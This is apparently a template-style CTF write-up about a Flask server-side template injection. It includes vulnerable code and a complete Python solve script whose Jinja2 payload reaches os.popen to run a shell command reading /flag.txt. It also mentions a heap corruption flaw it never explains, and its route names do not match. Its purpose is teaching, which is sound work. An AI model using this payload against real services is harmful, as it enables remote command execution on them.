---
title: "Example Writeup / CTF Challenge Solution"
pubDate: "2026-08-15"
updatedDate: "2026-08-15"
event: "Example CTF 2026"
author: "w4ve"
score: "500 pts"
place: "1st place"
description: "An example CTF writeup post demonstrating technical analysis, solution steps, and code snippets."
tags: ["web", "pwn"]
---

# Example Writeup / CTF Challenge Solution

An example CTF challenge writeup / post template demonstrating technical breakdown, vulnerability root-cause analysis, exploit payload construction, and flag retrieval.

## Overview

> **Target**: `http://challenge.example.com:8080`  
> **Category**: Web / Pwn  
> **Difficulty**: Medium  

This challenge simulates a real-world web API service backed by a C native binary plugin. The service contained both a template injection vulnerability and an unauthenticated heap corruption primitive.

## Vulnerability Analysis

### 1. Template Injection Primitive
The endpoint `/api/render` formats user inputs using `render_template_string`:

```python
@app.route('/render', methods=['POST'])
def render_template():
    user_name = request.json.get('name', 'guest')
    template = f"<h1>Hello {user_name}</h1>"
    return render_template_string(template)
```

Because `render_template_string` formats `user_name` directly into the Jinja2 template string before compiling, arbitrary template expressions can be evaluated.

### 2. Exploitation Walkthrough

1. **Class Traversal**: We traverse global builtins to access `os.popen`.
2. **Flag Retrieval**: Execute shell command `cat /flag.txt` to capture the flag.

```python
# Solve script payload
import requests

TARGET_URL = "http://challenge.example.com:8080/render"

def solve():
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}"
    res = requests.post(TARGET_URL, json={"name": payload})
    print("[+] Server Response:")
    print(res.text)

if __name__ == "__main__":
    solve()
```

## Flag & Key Takeaways

**Flag**: `nutflaggers{sst1_t3mpl4t3_1nj3ct10n_ftw}`

### Key Takeaways
- Always sanitize user input prior to rendering template strings.
- Never pass unescaped user parameters directly into `render_template_string()`.

